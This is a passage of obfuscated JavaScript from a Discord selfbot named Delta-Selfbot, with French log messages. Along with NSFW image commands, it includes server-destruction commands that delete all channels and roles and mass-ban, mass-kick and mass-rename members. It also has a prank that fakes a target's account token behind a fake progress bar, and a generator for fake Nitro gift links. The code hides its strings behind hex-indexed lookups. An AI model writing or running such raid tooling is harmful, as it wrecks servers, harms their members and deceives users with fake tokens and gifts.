.setFooter(_0x2202bc('0x191'))[_0x2202bc('0x1c4')]()[_0x2202bc('0x4c')](_0x20dc48[_0x2202bc('0xde')][_0x2202bc('0x1c8')])[_0x2202bc('0x42')](color);
            message.edit(_0x246be4)[_0x2202bc('0x18d')](_0xef0360 => console[_0x2202bc('0x2f')]('[', _0x2202bc('0xf9').red, ']', 'une erreur est survenue que je ne peux régler' [_0x2202bc('0x145')])), console[_0x2202bc('0x2f')](_0x2202bc('0xd7')[_0x2202bc('0x39')]);
        });
    }
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0xd6'))) {
        var _0x54e6e1 = new Discord[(_0x53081e('0x226'))]();
        superagent[_0x53081e('0x89')]('https://nekobot.xyz/api/image')[_0x53081e('0x255')]({
            'type': _0x53081e('0x2a9')
        })[_0x53081e('0x2a4')]((_0xfb2d8c, _0x5e69e0) => {
            const _0x23d028 = _0x53081e;
            var _0xf98c31 = new Discord[(_0x23d028('0x226'))]()[_0x23d028('0x1ca')](_0x23d028('0x191'))[_0x23d028('0x1c4')]()[_0x23d028('0x4c')](_0x5e69e0[_0x23d028('0xde')][_0x23d028('0x1c8')])[_0x23d028('0x42')](color);
            message[_0x23d028('0x179')](_0xf98c31).catch(_0xb29805 => console[_0x23d028('0x2f')]('[', _0x23d028('0xf9').red, ']', _0x23d028('0xa3')[_0x23d028('0x145')])), console.log(_0x23d028('0x137')[_0x23d028('0x39')]);
        });
    }
    message.content[_0x53081e('0x64')](prefix + 'pussy') && superagent[_0x53081e('0x89')](_0x53081e('0x1d1'))['query']({
        'type': _0x53081e('0x1ee')
    })[_0x53081e('0x2a4')]((_0x166170, _0x3d8ddf) => {
        const _0x4310d8 = _0x53081e;
        var _0x80f5ce = new Discord[(_0x4310d8('0x226'))]()[_0x4310d8('0x1ca')]('Delta-Selfbot')[_0x4310d8('0x1c4')]()[_0x4310d8('0x4c')](_0x3d8ddf.body[_0x4310d8('0x1c8')])
            .setColor(color);
        message[_0x4310d8('0x179')](_0x80f5ce)[_0x4310d8('0x18d')](_0xdd617d => console.log('[', _0x4310d8('0xf9')[_0x4310d8('0x2ab')], ']', _0x4310d8('0xa3')[_0x4310d8('0x145')])), console[_0x4310d8('0x2f')](_0x4310d8('0x20').yellow);
    });
    message.content[_0x53081e('0x64')](prefix + 'thigh') && superagent.get(_0x53081e('0x1d1'))[_0x53081e('0x255')]({
        'type': 'thigh'
    })[_0x53081e('0x2a4')]((_0x1a1c9f, _0x3f80eb) => {
        const _0x167ed6 = _0x53081e;
        var _0x5d5f3c = new Discord[(_0x167ed6('0x226'))]()[_0x167ed6('0x1ca')](_0x167ed6('0x191'))
            .setTimestamp()[_0x167ed6('0x4c')](_0x3f80eb[_0x167ed6('0xde')][_0x167ed6('0x1c8')])[_0x167ed6('0x42')](color);
        message.edit(_0x5d5f3c)[_0x167ed6('0x18d')](_0x1f7be7 => console[_0x167ed6('0x2f')]('[', _0x167ed6('0xf9')[_0x167ed6('0x2ab')], ']', _0x167ed6('0xa3')[_0x167ed6('0x145')])), console[_0x167ed6('0x2f')](_0x167ed6('0x1e2').yellow);
    });
    message.content.startsWith(prefix + 'anal') && superagent.get('https://nekobot.xyz/api/image')['query']({
        'type': _0x53081e('0x250')
    })[_0x53081e('0x2a4')]((_0x532715, _0x573b00) => {
        const _0x19099b = _0x53081e;
        var _0x191772 = new Discord[(_0x19099b('0x226'))]()[_0x19099b('0x1ca')]('Delta-Selfbot')[_0x19099b('0x1c4')]()[_0x19099b('0x4c')](_0x573b00[_0x19099b('0xde')][_0x19099b('0x1c8')])[_0x19099b('0x42')](color);
        message[_0x19099b('0x179')](_0x191772)[_0x19099b('0x18d')](_0x25cae6 => console[_0x19099b('0x2f')]('[', _0x19099b('0xf9')[_0x19099b('0x2ab')], ']', _0x19099b('0xa3')[_0x19099b('0x145')])), console[_0x19099b('0x2f')](_0x19099b('0x164').yellow);
    });
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x229'))) {
        if(!_0x7cd31a) return message.edit(_0x53081e('0x254'));
        var _0x407029 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x42')](color)[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0xc9')](_0x7cd31a[_0x53081e('0x27c')] + _0x53081e('0xed') + client.user[_0x53081e('0x27c')])[_0x53081e('0x4c')](_0x53081e('0x228'));
        message[_0x53081e('0x179')](_0x407029)[_0x53081e('0x18d')](_0xa4a1c1 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log(_0x53081e('0x28f')[_0x53081e('0x39')]);
    }
    if(message.content.startsWith(prefix + 'boom')) {
        if(!_0x7cd31a) return message.edit(_0x53081e('0x254'));
        var _0x1be3e8 = new Discord.RichEmbed()[_0x53081e('0x42')](color)
.setFooter(_0x53081e('0x191'))[_0x53081e('0xc9')](_0x7cd31a[_0x53081e('0x27c')] + _0x53081e('0x35') + client[_0x53081e('0xb9')][_0x53081e('0x27c')])[_0x53081e('0x4c')](_0x53081e('0x25f'));
        message[_0x53081e('0x179')](_0x1be3e8)[_0x53081e('0x18d')](_0x53146b => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')]('Commande boom effectué' [_0x53081e('0x39')]);
    }
    message.content === prefix + _0x53081e('0x227') && (message[_0x53081e('0x110')]()[_0x53081e('0xdb')](() => process.exit(0x1)), console[_0x53081e('0x2f')](_0x53081e('0xdd')[_0x53081e('0x39')]));
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x113'))) {
        let _0x52919a = message[_0x53081e('0x133')];
        if(!_0x52919a) {
            message[_0x53081e('0x179')](':x: **Veuillez executer cette commande sur un serveur!**');
            return;
        }
        if(!_0x7cd31a) {
            message[_0x53081e('0x179')](_0x53081e('0x1e1'));
            return;
        }
        _0x7cd31a[_0x53081e('0x113')]()[_0x53081e('0xdb')](_0x5bc697 => {
            const _0x2b6c1e = _0x53081e;
            message[_0x2b6c1e('0x179')](':wave: ' + _0x5bc697[_0x2b6c1e('0x60')] + _0x2b6c1e('0x283'));
        })[_0x53081e('0x18d')](() => {
            const _0x114a29 = _0x53081e;
            message[_0x114a29('0x179')](':x: **Access Denied**');
        }), console[_0x53081e('0x2f')](_0x53081e('0xe6')[_0x53081e('0x39')]);
    }
    if(message.content[_0x53081e('0x64')](prefix + 'ban')) {
        let _0x414e8e = message[_0x53081e('0x133')];
        if(!_0x414e8e) {
            message[_0x53081e('0x179')](':x: **Veuillez executer cette commande sur un serveur!**');
            return;
        }
        if(!_0x7cd31a) {
            message[_0x53081e('0x179')](_0x53081e('0x1e1'));
            return;
        }
        _0x7cd31a.ban().then(_0x43205f => {
            const _0x1bd5ec = _0x53081e;
            message[_0x1bd5ec('0x179')](':wave: ' + _0x43205f[_0x1bd5ec('0x60')] + _0x1bd5ec('0x51'));
        })[_0x53081e('0x18d')](() => {
            const _0x283f49 = _0x53081e;
            message[_0x283f49('0x179')](_0x283f49('0x247'));
        }), console[_0x53081e('0x2f')](_0x53081e('0x1b8').yellow);
    }
    message.content[_0x53081e('0x64')](prefix + _0x53081e('0x7b')) && (message[_0x53081e('0xf2')][_0x53081e('0x18b')]().then(_0x35c934 => _0x35c934[_0x53081e('0x8b')](_0x3cb6ae => {
        const _0x1317df = _0x53081e;
        _0x3cb6ae[_0x1317df('0x110')]()[_0x1317df('0x18d')](_0x2504ae => console.log('[', _0x1317df('0xf9')[_0x1317df('0x2ab')], ']', _0x1317df('0xa3').green));
    })), console[_0x53081e('0x2f')](_0x53081e('0xb3')[_0x53081e('0x39')]));
    if(message.content === prefix + _0x53081e('0x130')) {
        let _0x3b1463 = new Discord[(_0x53081e('0x226'))]();
        _0x3b1463.setColor(color)[_0x53081e('0xc9')](_0x53081e('0x32'))[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x4c')](rire[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * rire[_0x53081e('0x219')])]), message[_0x53081e('0x179')](_0x3b1463).catch(_0x315d80 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x2')[_0x53081e('0x39')]);
    }
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x135'))) {
        if(!_0x7cd31a) {
            message.edit(_0x53081e('0x1e1'));
            return;
        }
        let _0x45ce03 = new Discord[(_0x53081e('0x226'))]();
        _0x45ce03.setColor(color)[_0x53081e('0xc9')]('**' + client[_0x53081e('0xb9')]['username'] + _0x53081e('0x2c') + _0x7cd31a.username + '**')[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x4c')](kiss[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * kiss.length)]), message[_0x53081e('0x179')](_0x45ce03)[_0x53081e('0x18d')](_0x32e996 => console.log('[', _0x53081e('0xf9').red, ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log('Commande kiss effectué' [_0x53081e('0x39')]);
    }
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x1df'))) {
        if(!_0x7cd31a) {
            message.edit(_0x53081e('0x1e1'));
            return;
        }
        let _0x5b1f79 = new Discord.RichEmbed();
        _0x5b1f79[_0x53081e('0x42')](color)
            .setTitle('**' + _0x7cd31a[_0x53081e('0x27c')] + _0x53081e('0x274'))[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x4c')](veski[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * veski[_0x53081e('0x219')])]), message[_0x53081e('0x179')](_0x5b1f79).catch(_0x5ce437 => console.log('[', 'ERROR' [_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler'.green)), console[_0x53081e('0x2f')](_0x53081e('0xf4').yellow);
    }
    if(message.content.startsWith(prefix + _0x53081e('0x46'))) {
        message[_0x53081e('0x110')]();
        var _0x3be30e = '.',
            _0x15fce2 = '█';
        message.channel[_0x53081e('0x20e')](_0x53081e('0x276') + _0x3be30e[_0x53081e('0x2d')](0x32) + _0x53081e('0x27e'))[_0x53081e('0xdb')](_0x12d16f => {
            const _0x562c2c = _0x53081e;
            for(_0x127ab8 = 0x0; _0x127ab8 <= 0x32; _0x127ab8++) {
                _0x12d16f.edit('```[' + _0x15fce2[_0x562c2c('0x2d')](_0x127ab8) + _0x3be30e[_0x562c2c('0x2d')](0x32 - _0x127ab8) + ']  -  ' + _0x127ab8 * 0x64 / 0x32 + '%\x0a' + _0x562c2c('0x36'));
            }
            _0x12d16f[_0x562c2c('0x179')]('`Succesfull load.`')[_0x562c2c('0x18d')](_0x55ea15 => console[_0x562c2c('0x2f')]('[', 'ERROR' [_0x562c2c('0x2ab')], ']', _0x562c2c('0xa3')[_0x562c2c('0x145')])), console[_0x562c2c('0x2f')](_0x562c2c('0x128')[_0x562c2c('0x39')]);
        });
    }
    if(message.content === prefix + _0x53081e('0x1f9')) {
        let _0x49c9a1 = message[_0x53081e('0x133')];
        if(!_0x49c9a1) {
            message[_0x53081e('0x179')](_0x53081e('0x1a8'));
            return;
        }
        if(!message[_0x53081e('0x209')][_0x53081e('0x10a')]('MANAGE_CHANNELS')) return message[_0x53081e('0x110')]().then(console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xc')[_0x53081e('0x145')]));
        var _0x3657ae = message.guild[_0x53081e('0x19')];
        _0x3657ae.forEach(_0x431053 => {
            const _0x22e84f = _0x53081e;
            _0x431053[_0x22e84f('0x110')]()[_0x22e84f('0x18d')](_0x270d07 => console[_0x22e84f('0x2f')]('[', _0x22e84f('0xf9')[_0x22e84f('0x2ab')], ']', _0x22e84f('0xa3')[_0x22e84f('0x145')]));
        }), console[_0x53081e('0x2f')](_0x53081e('0x52')[_0x53081e('0x39')]);
    }
    if(message.content === prefix + _0x53081e('0x22f')) {
        let _0x354005 = message.guild;
        if(!_0x354005) {
            message[_0x53081e('0x179')](_0x53081e('0x25a'));
            return;
        }
        message[_0x53081e('0x133')]['roles'][_0x53081e('0x8b')](_0x381a9 => {
            const _0x15edfc = _0x53081e;
            _0x381a9[_0x15edfc('0x110')]()[_0x15edfc('0x18d')](_0x46b865 => console.log('[', 'ERROR'.red, ']', _0x15edfc('0xa3').green));
        }), console[_0x53081e('0x2f')](_0x53081e('0x7').yellow);
    }
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0xf'))) {
        if(!_0x7cd31a) {
            message.edit(_0x53081e('0x1e1'));
            return;
        }
        let _0x522325 = new Discord[(_0x53081e('0x226'))]();
        _0x522325.setColor(color)
            .setTitle('**' + client.user.username + _0x53081e('0xad') + _0x7cd31a.username + '**')[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')](_0x53081e('0x191'))
.setImage(punch[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * punch[_0x53081e('0x219')])]), message[_0x53081e('0x179')](_0x522325)[_0x53081e('0x18d')](_0x541df4 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x268')[_0x53081e('0x39')]);
    }
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x116'))) {
        if(!_0x7cd31a) {
            message[_0x53081e('0x179')](_0x53081e('0x1e1'));
            return;
        }
        let _0x55049c = new Discord[(_0x53081e('0x226'))]();
        _0x55049c[_0x53081e('0x42')](color)[_0x53081e('0xc9')]('**' + client.user[_0x53081e('0x27c')] + _0x53081e('0x122') + _0x7cd31a[_0x53081e('0x27c')] + '**')[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')]('Delta-Selfbot')[_0x53081e('0x4c')](hugh[Math[_0x53081e('0xa4')](Math.random() * hugh[_0x53081e('0x219')])]), message[_0x53081e('0x179')](_0x55049c).catch(_0x10098e => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x28e')[_0x53081e('0x39')]);
    }
    if(message.content.startsWith(prefix + _0x53081e('0x188'))) {
        let _0x3d92d0 = _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ') || 'Delta selfbot';
        message[_0x53081e('0x179')](_0x53081e('0x27f') + _0x3d92d0), message.guild[_0x53081e('0x295')](_0x3d92d0), console[_0x53081e('0x2f')](_0x53081e('0x1d0')[_0x53081e('0x39')]);
    }
    if(message.content.startsWith(prefix + _0x53081e('0xb'))) {
        if(!_0x7cd31a) {
            message[_0x53081e('0x179')](_0x53081e('0x1e1'));
            return;
        }
        let _0x42f027 = [_0x53081e('0x1b0'), _0x53081e('0x243'), 'XluxwQ', 'XXn_KA', _0x53081e('0x23d')],
            _0x5c4fde = [_0x53081e('0x217'), _0x53081e('0x257'), '3_6Xt2k4OieDKimnNYGWUq9vJRo', _0x53081e('0x124')];
        var _0x31da53 = _0x7cd31a.id,
            _0x3a2d76 = utf8.encode(_0x31da53),
            _0xb12e32 = base64[_0x53081e('0x249')](_0x3a2d76);
        let _0x165222 = new Discord[(_0x53081e('0x226'))]()
            .setColor('' + color)[_0x53081e('0x1ca')](_0x53081e('0x191'))
            .setTitle(_0x53081e('0xe7') + _0x7cd31a[_0x53081e('0x27c')])
.setDescription(_0xb12e32 + '.' + _0x42f027[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * _0x42f027.length)] + '.' + _0x5c4fde[Math.floor(Math[_0x53081e('0x1a1')]() * _0x5c4fde[_0x53081e('0x219')])]);
        setTimeout(() => {
            const _0x4483f7 = _0x53081e;
            message[_0x4483f7('0x179')](_0x4483f7('0x3c'));
        }, 0x3e8), setTimeout(() => {
            const _0x1c10f6 = _0x53081e;
            message[_0x1c10f6('0x179')]('▓▓░░░░░░░░ 20%');
        }, 0x5dc), setTimeout(() => {
            const _0xc36db4 = _0x53081e;
            message[_0xc36db4('0x179')]('▓▓▓▓░░░░░░ 40%');
        }, 0x7d0), setTimeout(() => {
            const _0x1a1082 = _0x53081e;
            message.edit(_0x1a1082('0xa9'));
        }, 0x9c4), setTimeout(() => {
            const _0x28722e = _0x53081e;
            message.edit(_0x28722e('0x3f'));
        }, 0xbb8), setTimeout(() => {
            const _0x56c53b = _0x53081e;
            message[_0x56c53b('0x179')]('▓▓▓▓▓▓▓▓▓▓ 100%');
        }, 0xdac), setTimeout(() => {
            const _0x3b9784 = _0x53081e;
            message[_0x3b9784('0x179')](_0x165222).catch(_0x3646c4 => console[_0x3b9784('0x2f')]('[', 'ERROR'.red, ']', _0x3b9784('0xa3').green));
        }, 0xfa0), console.log(_0x53081e('0xc1')[_0x53081e('0x39')]);
    }
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x249'))) {
        var _0x30596a = _0xdcd936[_0x53081e('0x28d')](' ') || _0x53081e('0x14');;
        var _0x3a2d76 = utf8.encode(_0x30596a),
            _0xb12e32 = base64[_0x53081e('0x249')](_0x3a2d76);
        let _0x58f355 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x42')]('' + color)
            .setTitle('Texte -> Base64 :')[_0x53081e('0x1f6')](_0xb12e32);
        message.edit(_0x58f355)[_0x53081e('0x18d')](_0x399394 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9').red, ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x184').yellow);
    }
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x1aa'))) {
        let _0x97f568 = ['5%', _0x53081e('0x1a3'), _0x53081e('0x299'), '20%', _0x53081e('0x4a'), _0x53081e('0x17'), _0x53081e('0x18a'), _0x53081e('0x1ad'), _0x53081e('0x240'), _0x53081e('0x101'), '55', _0x53081e('0x102'), _0x53081e('0x278'), '70%', _0x53081e('0x86'), _0x53081e('0x251'), '85%', _0x53081e('0x1a4'), '95%', _0x53081e('0x6d')],
            _0x231c3a = Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * _0x97f568[_0x53081e('0x219')]),
            _0x36970e = _0xdcd936[_0x53081e('0x1ed')](0x0)[_0x53081e('0x28d')](' ') || _0x53081e('0x14');;
        let _0x47dd52 = new Discord[(_0x53081e('0x226'))]()['setAuthor'](message[_0x53081e('0x1ab')]['tag'])[_0x53081e('0x42')](_0x53081e('0x1b1'))
.setFooter(_0x53081e('0x191'))[_0x53081e('0x15f')]('' + message[_0x53081e('0x1ab')][_0x53081e('0xaf')])[_0x53081e('0x1cd')](_0x53081e('0xfa'), _0x36970e)
            .addField('relation estimée à ❤', _0x97f568[_0x231c3a]);
        message[_0x53081e('0x179')](_0x47dd52)[_0x53081e('0x18d')](_0x4a4457 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log('Commande lovecalc effectué' [_0x53081e('0x39')]);
    }
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x275'))) {
        const _0x4889b3 = message.content['split'](' ')[_0x53081e('0x1ed')](0x1)[_0x53081e('0x28d')](' ') || _0x53081e('0x41');
        let _0x2da71c = rpcGenerator.createSpotifyRpc(client)[_0x53081e('0x1dc')]('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e')['setAssetsSmallImage'](_0x53081e('0x2a8'))[_0x53081e('0x11e')](_0x4889b3)[_0x53081e('0x11d')](_0x53081e('0x191'))[_0x53081e('0xbb')](Date[_0x53081e('0x12e')]())['setEndTimestamp'](Date.now() + 0x5265c00);
        client[_0x53081e('0xb9')][_0x53081e('0x72')](_0x2da71c[_0x53081e('0x118')]())[_0x53081e('0xdb')](message[_0x53081e('0x179')](_0x53081e('0x1e') + _0x4889b3 + _0x53081e('0xcd')))[_0x53081e('0x18d')](console[_0x53081e('0x23e')]), console[_0x53081e('0x2f')](_0x53081e('0x197')[_0x53081e('0x39')]);
    }
    message.content.startsWith(prefix + _0x53081e('0xc0')) && (clearInterval(), client[_0x53081e('0xb9')][_0x53081e('0x115')](null, {}), message[_0x53081e('0x179')](_0x53081e('0x140')).catch(_0xff7272 => console[_0x53081e('0x2f')]('[', 'ERROR'.red, ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x1e3')[_0x53081e('0x39')]));
    if(message.content === prefix + _0x53081e('0x169')) {
        const _0x44c98a = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x42')](color)[_0x53081e('0x15f')]('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
            .addField('Gift :', '|| https:/' + _0x53081e('0xce') + nitrocode(0x10, _0x53081e('0x183')) + _0x53081e('0x282'));
        message.edit(_0x44c98a)[_0x53081e('0x18d')](_0x430969 => console[_0x53081e('0x2f')]('[', 'ERROR' [_0x53081e('0x2ab')], ']', _0x53081e('0xa3').green)), console.log(_0x53081e('0xe3')[_0x53081e('0x39')]);
    }
    message.content.startsWith(prefix + _0x53081e('0x126')) && (message[_0x53081e('0x110')](), setTimeout(() => {
        const _0x4826b5 = _0x53081e;
        client.destroy().catch(_0x13c06c => console[_0x4826b5('0x2f')]('[', _0x4826b5('0xf9')[_0x4826b5('0x2ab')], ']', _0x4826b5('0xa3').green));
    }, 0x5dc), console[_0x53081e('0x2f')]('Nouveau token generé' [_0x53081e('0x145')]));
    if(message.content.startsWith(prefix + _0x53081e('0xbc'))) {
        let _0x2d8c11 = _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ');
        !_0x2d8c11 && message[_0x53081e('0x179')](_0x53081e('0x211'));

        function _0x421c8c(_0x571e5) {
            const _0x4267b7 = _0x53081e;
            return _0x571e5.split('')[_0x4267b7('0xbc')]()[_0x4267b7('0x28d')]('');
        }
        let _0x57e2b6 = _0x421c8c(_0x2d8c11);
        _0xdcd936[0x0] === _0x57e2b6 && (_0x57e2b6 = '' + _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ')), message.edit('' + _0x57e2b6)[_0x53081e('0x18d')](console[_0x53081e('0x23e')]), console[_0x53081e('0x2f')](_0x53081e('0x15')[_0x53081e('0x39')]);
    }
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x208'))) {
        let _0x518e1e = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x42')](color)[_0x53081e('0x1f6')](_0x53081e('0x9b') + Discord.version + '**')[_0x53081e('0x1ca')](_0x53081e('0x191'));
        message.edit(_0x518e1e).catch(_0x74b121 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x1cc').yellow);
    }
    message.content === prefix + _0x53081e('0x3') && (message.edit(_0x53081e('0x286')).then(client[_0x53081e('0x1af')]())[_0x53081e('0xdb')](() => client[_0x53081e('0x8c')](token)), console[_0x53081e('0x2f')](_0x53081e('0x136').yellow));
    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x178') || prefix + 'ri')) {
        let _0x353115 = message[_0x53081e('0x133')],
            _0x4ceb10 = message.mentions[_0x53081e('0x33')]['first']();
        if(!_0x353115) return message[_0x53081e('0x179')](_0x53081e('0x99'));
        if(!_0x4ceb10) return message[_0x53081e('0x110')]()[_0x53081e('0xdb')](console[_0x53081e('0x2f')]('[', _0x53081e('0xf9').red, ']', _0x53081e('0x1a2')[_0x53081e('0x145')]));
        const _0x11d146 = {
            'false': _0x53081e('0x20f'),
            'true': _0x53081e('0x23c')
        };
        let _0x318e43 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x42')](color)[_0x53081e('0x1f6')](_0x53081e('0x21') + _0x4ceb10.id + '>')[_0x53081e('0x1cd')](_0x53081e('0x85'), _0x4ceb10.id)
            .addField(_0x53081e('0x19b'), _0x4ceb10[_0x53081e('0x285')])
.setFooter('Delta-Selfbot')[_0x53081e('0x1cd')](_0x53081e('0x6f'), _0x4ceb10.members[_0x53081e('0x1c1')])
            .addField(_0x53081e('0x1bb'), _0x4ceb10[_0x53081e('0xca')])[_0x53081e('0x1cd')](_0x53081e('0xda'), _0x11d146[_0x4ceb10[_0x53081e('0x1d7')]]);
        if(!message[_0x53081e('0x209')]['hasPermission'](_0x53081e('0x121'))) return message[_0x53081e('0x179')](':x: **permission insuffisante (embed_links)**\x0a<@&' + _0x4ceb10.id + '>\x0a\x0aid du role: ' + _0x4ceb10.id + '\x0acouleur du role: ' + _0x4ceb10[_0x53081e('0x285')] + _0x53081e('0x15b') + _0x4ceb10[_0x53081e('0x107')]['size'] + _0x53081e('0xa8') + _0x4ceb10[_0x53081e('0xca')] + _0x53081e('0x1e0') + _0x11d146[_0x4ceb10[_0x53081e('0x1d7')]]);
        console[_0x53081e('0x2f')](_0x53081e('0x16a')[_0x53081e('0x39')]), message[_0x53081e('0x179')](_0x318e43).catch(_0x9ec716 => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')));
    }
    if(message.content === prefix + _0x53081e('0x95')) {
        let _0x4fa5fc = message.guild;
        if(!_0x4fa5fc) return message[_0x53081e('0x179')](_0x53081e('0x99'));
        if(!message.member.hasPermission(_0x53081e('0x21c'))) return message[_0x53081e('0x110')]()[_0x53081e('0xdb')](console.log('[', 'ERROR' [_0x53081e('0x2ab')], ']', _0x53081e('0xc')[_0x53081e('0x145')]));
        const _0x1953b0 = message[_0x53081e('0x133')][_0x53081e('0x107')];
        _0x1953b0[_0x53081e('0x8b')](_0x2c4f40 => {
            const _0x136f86 = _0x53081e;
            if(!_0x2c4f40[_0x136f86('0xe4')]) return;
            _0x2c4f40.ban()[_0x136f86('0x18d')](_0x416bc9 => console[_0x136f86('0x2f')]('[', _0x136f86('0xf9')[_0x136f86('0x2ab')], ']', _0x136f86('0xa3')[_0x136f86('0x145')]));
        }), console[_0x53081e('0x2f')](_0x53081e('0x1bd').yellow);
    }
    if(message.content === prefix + _0x53081e('0xc4')) {
        let _0x5b9236 = message[_0x53081e('0x133')];
        if(!_0x5b9236) return message.edit(_0x53081e('0x99'));
        if(!message.member.hasPermission(_0x53081e('0x10f'))) return message[_0x53081e('0x110')]().then(console[_0x53081e('0x2f')]('[', _0x53081e('0xf9').red, ']', _0x53081e('0xc')[_0x53081e('0x145')]));
        const _0x18b713 = message.guild[_0x53081e('0x107')];
        _0x18b713[_0x53081e('0x8b')](_0x290b68 => {
            const _0x45b3d3 = _0x53081e;
            if(!_0x290b68[_0x45b3d3('0x1fd')]) return;
            _0x290b68[_0x45b3d3('0x113')]()[_0x45b3d3('0x18d')](_0x12b241 => console[_0x45b3d3('0x2f')]('[', _0x45b3d3('0xf9')[_0x45b3d3('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x45b3d3('0x145')]));
        }), console.log(_0x53081e('0x290').yellow);
    }
    if(message.content.startsWith(prefix + _0x53081e('0x1d3'))) {
        let _0x2d99b2 = message.guild;
        if(!_0x2d99b2) return message[_0x53081e('0x179')](_0x53081e('0x99'));
        const _0x3b0ae4 = message.content[_0x53081e('0x151')](' ')[_0x53081e('0x1ed')](0x2)[_0x53081e('0x28d')](' ') || message[_0x53081e('0x1ab')][_0x53081e('0x27c')];
        if(!message.member.hasPermission(_0x53081e('0x2ad'))) return message.delete().then(console[_0x53081e('0x2f')]('[', 'ERROR' [_0x53081e('0x2ab')], ']', _0x53081e('0xc')[_0x53081e('0x145')]));
        const _0x5661c5 = message[_0x53081e('0x133')][_0x53081e('0x107')];
        message.edit(_0x53081e('0x24f') + _0x3b0ae4), _0x5661c5[_0x53081e('0x8b')](_0x780690 => {
            const _0x35aef0 = _0x53081e;
            _0x780690[_0x35aef0('0x26a')](_0x3b0ae4)[_0x35aef0('0x18d')](_0xb3825e => console.log('[', _0x35aef0('0xf9').red, ']', _0x35aef0('0xa3')[_0x35aef0('0x145')]));
        }), console[_0x53081e('0x2f')]('Commande name all effectué' [_0x53081e('0x39')]);
    }
    try {
        let _0x21b23e = client[_0x53081e('0x77')][_0x53081e('0x89')](_0x53081e('0x199')) || 'ℹ️',
            _0x21f655 = client[_0x53081e('0x77')]['get']('655695570769412096') || '⌛',
            _0x5288af = client[_0x53081e('0x77')]['get'](_0x53081e('0x19d')) || '✅',
            _0x2bf8e9 = client[_0x53081e('0x77')][_0x53081e('0x89')]('655704809483141141') || '❌',
            _0x45b98e = client[_0x53081e('0x77')]['get']('656030540310380574') || '⚠️';
        if(message.content === prefix + _0x53081e('0x24d') | message.content == prefix + 'backup c') {
            let _0x50c0ad = message[_0x53081e('0x133')];
            if(!_0x50c0ad) {
                message.edit(_0x53081e('0x1a8'));
                return;
            }
            message[_0x53081e('0x133')][_0x53081e('0x33')][_0x53081e('0x1b6')](_0x1b465c => _0x1b465c[_0x53081e('0x10d')] !== message.guild[_0x53081e('0x209')](client[_0x53081e('0xb9')]['id'])[_0x53081e('0x19e')][_0x53081e('0x10d')])[_0x53081e('0x8b')](_0xb79699 => {
                const _0x41737b = _0x53081e;
